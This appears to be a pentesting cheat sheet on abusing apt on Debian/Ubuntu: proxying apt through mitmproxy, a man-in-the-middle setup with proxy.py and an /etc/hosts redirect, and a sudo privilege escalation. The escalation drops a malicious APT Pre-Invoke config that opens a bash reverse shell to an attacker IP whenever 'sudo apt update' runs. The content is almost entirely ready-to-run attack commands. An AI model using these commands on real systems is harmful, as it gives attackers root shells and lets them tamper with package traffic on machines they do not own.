---
title: "Apt"
tags: ["Mitm", "Mitmproxy", "apt", "apt-get", "Sudo", "Ubuntu", "Debian", "Package Management"]
---

### Proxy apt / apt-get Requeset

#### 1. Start Proxy In Local Machine

```console
mitmproxy --listen-host 0.0.0.0 --listen-port <LOCAL_PORT>
```

#### 2. Add Proxy Path in Target Machine

```console
# For target with no internet
sudo http_proxy=http://<LOCAL_IP>:<LOCAL_PORT> apt install <PACKEGE>
```

<small>*Ref: [mitmproxy](https://mitmproxy.org/)*</small>

---

### MITM (Man-in-the-Middle)

#### 1. Add Proxy Path in Target Machine

```console
export http_proxy=http://<LOCAL_IP>:<LOCAL_PORT>
```

#### 2. Start Proxy in Local Machine

```console
# Tool
pip3 install --upgrade proxy.py
```

```console
# Start a proxy server
proxy --hostname 0.0.0.0 --port <LOCAL_PORT>
```

#### 3. Redirect Traffic to Our Server

```console
# Edit /etc/hosts in target machine
<LOCAL_IP> apt.update.example.com
```

---

### SUDO

#### 1. Create a Malicious Config

```console
echo 'APT::Update::Pre-Invoke {"bash -c '\''bash -i >& /dev/tcp/<LOCAL_IP>/<LOCAL_PORT> 0>&1'\''"}' > /etc/apt/apt.conf.d/evil
```

#### 2. Exploit

```console
sudo apt update -y
```

<br>